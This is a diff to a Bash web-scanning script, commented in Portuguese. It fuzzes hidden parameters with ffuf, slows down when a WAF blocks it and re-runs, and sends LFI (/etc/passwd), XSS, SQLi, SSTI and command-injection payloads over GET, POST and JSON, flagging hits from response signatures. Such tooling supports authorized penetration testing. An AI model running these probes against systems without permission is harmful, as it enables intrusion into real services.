@@ -407,47 +407,70 @@ scan_params() {
         return 1
     fi
 
+    local threads="${THREADS_FFUF:-50}"
+
     echo -e "\n${BOLD}══ PARAMETER FUZZING ══${RST}"
     info "URL: ${target_url}"
     info "Wordlist: $(basename "$wl") ($(wc -l < "$wl") entradas)"
+    info "Threads: ${threads}"
 
-    # ── FASE A: Descobrir parâmetros que alteram a resposta ──
-    info "Fase A — Descobrindo parâmetros ocultos..."
+    # ── FASE A: Descobrir parâmetros GET ──
+    info "Fase A — Descobrindo parâmetros GET ocultos..."
 
-    # Baseline: response size SEM parâmetros
-    baseline_size=$(curl -sk -o /dev/null -w "%{size_download}" --connect-timeout 5 "$target_url" 2>/dev/null)
+    baseline_size=$(curl -sk -o /dev/null -w "%{size_download}" --connect-timeout "${TIMEOUT_CURL:-5}" "$target_url" 2>/dev/null)
     info "Baseline size: ${baseline_size} bytes"
 
-    # ffuf com FUZZ como nome do parâmetro
+    # Rate limiting adaptativo
+    local ffuf_rate_args=""
+    if [[ "${RATE_LIMIT:-0}" -gt 0 ]]; then
+        ffuf_rate_args="-rate ${RATE_LIMIT}"
+    fi
+
     ffuf -u "${target_url}?FUZZ=test123" \
         -w "$wl" \
         -mc all \
         -fs "$baseline_size" \
         -ac \
-        -t 50 -c \
+        -t "$threads" -c $ffuf_rate_args \
+        -timeout "${TIMEOUT_FFUF:-10}" \
         -o "${OUTDIR}/ffuf_params_discovery.json" \
         -of json 2>/dev/null | tee "${OUTDIR}/ffuf_params_discovery.txt" 2>/dev/null || true
 
-    # Extrair parâmetros: tentar do texto (mais confiável) e do JSON
+    # Verificar se WAF bloqueou (muitos 429/403)
+    if [[ "${RATE_LIMIT_ADAPTIVE:-true}" == "true" && -s "${OUTDIR}/ffuf_params_discovery.txt" ]]; then
+        local waf_hits
+        waf_hits=$(grep -c '\[429\]\|\[403\]' "${OUTDIR}/ffuf_params_discovery.txt" 2>/dev/null || echo 0)
+        if [[ $waf_hits -gt 10 ]]; then
+            local new_threads="${RATE_LIMIT_MIN_THREADS:-5}"
+            warn "WAF detectado (${waf_hits}x 429/403) — reduzindo threads: ${threads} → ${new_threads}"
+            threads=$new_threads
+            # Re-rodar com menos threads
+            ffuf -u "${target_url}?FUZZ=test123" \
+                -w "$wl" -mc all -fs "$baseline_size" -ac \
+                -t "$new_threads" -c -rate 10 \
+                -timeout "${TIMEOUT_FFUF:-10}" \
+                -o "${OUTDIR}/ffuf_params_discovery.json" \
+                -of json 2>/dev/null | tee "${OUTDIR}/ffuf_params_discovery.txt" 2>/dev/null || true
+            ok "Re-scan com ${new_threads} threads concluído."
+        fi
+    fi
+
+    # Extrair parâmetros encontrados
     local params_found=()
     local params_file="${OUTDIR}/params_found_raw.txt"
     > "$params_file"
 
-    # Fonte 1: Output de texto do ffuf (linhas com [Status:])
-    # Formato: "paramname    [Status: 200, Size: 1234, ...]"
-    # Precisa limpar ANSI codes do ffuf -c (cores)
+    # Texto do ffuf (mais confiável)
     if [[ -s "${OUTDIR}/ffuf_params_discovery.txt" ]]; then
         sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "${OUTDIR}/ffuf_params_discovery.txt" 2>/dev/null \
             | grep '\[Status:' | awk '{print $1}' | sort -u >> "$params_file"
     fi
-
-    # Fonte 2: JSON do ffuf (fallback)
+    # JSON fallback
     if [[ -s "${OUTDIR}/ffuf_params_discovery.json" ]]; then
         grep -oP '"FUZZ"\s*:\s*"\K[^"]+' "${OUTDIR}/ffuf_params_discovery.json" 2>/dev/null \
             | sort -u >> "$params_file"
     fi
 
-    # Deduplicar e carregar
     sort -u "$params_file" -o "$params_file"
     while IFS= read -r p; do
         [[ -n "$p" && "$p" != "FUZZ" ]] && params_found+=("$p")
@@ -466,11 +489,10 @@ scan_params() {
         echo -e "    ${GRN}→${RST} ${p}"
     done
 
-    # ── FASE B: Testar injeções nos parâmetros encontrados ──
+    # ── FASE B: Testar injeções GET ──
     echo ""
-    info "Fase B — Testando injeções nos ${#params_found[@]} parâmetros..."
+    info "Fase B — Testando injeções GET nos ${#params_found[@]} parâmetros..."
 
-    # Payloads de teste por categoria
     declare -A PAYLOADS
     PAYLOADS[LFI]="../../../../etc/passwd"
     PAYLOADS[LFI2]="....//....//....//etc/passwd"
@@ -488,90 +510,105 @@ scan_params() {
 
     > "${OUTDIR}/params_vulns.txt"
 
-    for param in "${params_found[@]}"; do
-        echo -e "\n    ${CYN}── Testando: ${param} ──${RST}"
+    _test_payload() {
+        local param="$1" vuln_type="$2" payload="$3" method="$4" resp="$5"
+        local is_vuln=false vuln_evidence=""
 
-        # Baseline com valor normal
-        normal_resp=$(curl -sk --connect-timeout 5 "${target_url}?${param}=normaltest123" 2>/dev/null)
+        case "$vuln_type" in
+            LFI|LFI2)
+                echo "$resp" | grep -q "root:x:0:0\|root:.*:/bin/" && { is_vuln=true; vuln_evidence="/etc/passwd no response!"; } ;;
+            XSS|XSS2)
+                echo "$resp" | grep -q "<script>alert(1)</script>\|onerror=alert" && { is_vuln=true; vuln_evidence="payload refletido sem sanitização"; } ;;
+            SQLi|SQLi2|SQLi3)
+                if echo "$resp" | grep -qi "sql syntax\|mysql\|sqlite\|postgresql\|ORA-\|unterminated\|ODBC"; then
+                    is_vuln=true; vuln_evidence="erro SQL no response"
+                fi ;;
+            SSTI)
+                echo "$resp" | grep -q "49" && { is_vuln=true; vuln_evidence="{{7*7}}=49 refletido!"; } ;;
+            CMDI)
+                echo "$resp" | grep -q "uid=\|gid=" && { is_vuln=true; vuln_evidence="output de comando detectado!"; } ;;
+            SSRF|SSRF2)
+                ;; # Precisa de out-of-band
+        esac
+
+        if $is_vuln; then
+            echo -e "      ${RED}🔴 ${method} ${vuln_type}: POSSÍVEL VULN! ${vuln_evidence}${RST}"
+            echo "[VULN] method=${method} param=${param} type=${vuln_type} evidence=${vuln_evidence}" >> "${OUTDIR}/params_vulns.txt"
+        fi
+    }
+
+    for param in "${params_found[@]}"; do
+        echo -e "\n    ${CYN}── ${param} ──${RST}"
+
+        normal_resp=$(curl -sk --connect-timeout "${TIMEOUT_CURL:-5}" "${target_url}?${param}=normaltest123" 2>/dev/null)
         normal_size=${#normal_resp}
 
         for vuln_type in "${!PAYLOADS[@]}"; do
             payload="${PAYLOADS[$vuln_type]}"
-            # URL encode básico
             encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")
 
-            test_resp=$(curl -sk --connect-timeout 5 "${target_url}?${param}=${encoded}" 2>/dev/null)
+            test_resp=$(curl -sk --connect-timeout "${TIMEOUT_CURL:-5}" "${target_url}?${param}=${encoded}" 2>/dev/null)
             test_size=${#test_resp}
 
-            # Verificar indicadores de vulnerabilidade
-            is_vuln=false
-            vuln_evidence=""
+            _test_payload "$param" "$vuln_type" "$payload" "GET" "$test_resp"
 
-            case "$vuln_type" in
-                LFI|LFI2)
-                    if echo "$test_resp" | grep -q "root:x:0:0\|root:.*:/bin/"; then
-                        is_vuln=true
-                        vuln_evidence="/etc/passwd no response!"
-                    fi
-                    ;;
-                XSS|XSS2)
-                    if echo "$test_resp" | grep -q "<script>alert(1)</script>\|onerror=alert"; then
-                        is_vuln=true
-                        vuln_evidence="payload refletido sem sanitização"
-                    fi
-                    ;;
-                SQLi|SQLi2|SQLi3)
-                    if echo "$test_resp" | grep -qi "sql syntax\|mysql\|sqlite\|postgresql\|ORA-\|unterminated\|ODBC"; then
-                        is_vuln=true
-                        vuln_evidence="erro SQL no response"
-                    elif [[ $((test_size - normal_size)) -gt 500 || $((test_size - normal_size)) -lt -500 ]]; then
-                        # Diferença grande de tamanho pode indicar bypass de auth
-                        vuln_evidence="size diff significativo (${normal_size}→${test_size})"
-                    fi
-                    ;;
-                SSRF|SSRF2)
-                    # Difícil detectar sem out-of-band, marcar se response mudou
-                    if [[ $((test_size - normal_size)) -gt 200 || $((test_size - normal_size)) -lt -200 ]]; then
-                        vuln_evidence="response alterado com URL interna"
-                    fi
-                    ;;
-                SSTI)
-                    if echo "$test_resp" | grep -q "49"; then
-                        is_vuln=true
-                        vuln_evidence="{{7*7}}=49 refletido!"
-                    fi
-                    ;;
-                CMDI)
-                    if echo "$test_resp" | grep -q "uid=\|gid="; then
-                        is_vuln=true
-                        vuln_evidence="output de comando detectado!"
-                    fi
-                    ;;
-            esac
-
-            if $is_vuln; then
-                echo -e "      ${RED}🔴 ${vuln_type}: POSSÍVEL VULN! ${vuln_evidence}${RST}"
-                echo "[VULN] param=${param} type=${vuln_type} evidence=${vuln_evidence}" >> "${OUTDIR}/params_vulns.txt"
-            elif [[ -n "$vuln_evidence" ]]; then
-                echo -e "      ${YLW}🟡 ${vuln_type}: ${vuln_evidence}${RST}"
-                echo "[INTERESTING] param=${param} type=${vuln_type} evidence=${vuln_evidence}" >> "${OUTDIR}/params_vulns.txt"
+            # Size diff check (genérico)
+            if [[ $((test_size - normal_size)) -gt 500 || $((test_size - normal_size)) -lt -500 ]]; then
+                echo -e "      ${YLW}🟡 GET ${vuln_type}: size diff (${normal_size}→${test_size})${RST}"
+                echo "[INTERESTING] method=GET param=${param} type=${vuln_type} evidence=size_diff(${normal_size}→${test_size})" >> "${OUTDIR}/params_vulns.txt"
             fi
         done
     done
 
+    # ── FASE C: Testar injeções POST ──
+    echo ""
+    info "Fase C — Testando injeções POST..."
+
+    for param in "${params_found[@]}"; do
+        echo -e "\n    ${MAG}── POST: ${param} ──${RST}"
+
+        # Baseline POST
+        post_normal=$(curl -sk --connect-timeout "${TIMEOUT_CURL:-5}" \
+            -X POST -d "${param}=normaltest123" "$target_url" 2>/dev/null)
+        post_normal_size=${#post_normal}
+
+        for vuln_type in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$vuln_type]}"
+            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")
+
+            # POST urlencoded
+            post_resp=$(curl -sk --connect-timeout "${TIMEOUT_CURL:-5}" \
+                -X POST -d "${param}=${encoded}" "$target_url" 2>/dev/null)
+
+            _test_payload "$param" "$vuln_type" "$payload" "POST" "$post_resp"
+
+            # POST JSON
+            json_resp=$(curl -sk --connect-timeout "${TIMEOUT_CURL:-5}" \
+                -X POST -H "Content-Type: application/json" \
+                -d "{\"${param}\": \"${payload}\"}" "$target_url" 2>/dev/null)
+
+            _test_payload "$param" "$vuln_type" "$payload" "POST-JSON" "$json_resp"
+        done
+    done
+
+    # ── Resumo ──
     echo ""
     if [[ -s "${OUTDIR}/params_vulns.txt" ]]; then
-        local vulns=$(grep -c "VULN" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
-        local interesting=$(grep -c "INTERESTING" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
-        echo -e "    ${RED}🔴 Vulneráveis: ${vulns}${RST}"
+        local get_vulns=$(grep -c "method=GET.*\[VULN\]" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
+        local post_vulns=$(grep -c "method=POST" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
+        local total_vulns=$(grep -c "\[VULN\]" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
+        local interesting=$(grep -c "\[INTERESTING\]" "${OUTDIR}/params_vulns.txt" 2>/dev/null || echo 0)
+        echo -e "    ${RED}🔴 Vulneráveis: ${total_vulns}${RST} (GET: ${get_vulns}, POST: ${post_vulns})"
         echo -e "    ${YLW}🟡 Interessantes: ${interesting}${RST}"
         ok "→ params_vulns.txt"
     else
-        ok "Nenhuma injeção detectada nos parâmetros encontrados."
+        ok "Nenhuma injeção detectada."
     fi
     ok "→ params_found.txt"
     ok "Concluído."
 }
+
+
 
 # ═══════════════════════════════════════════
 #  MENU — Listar wordlists
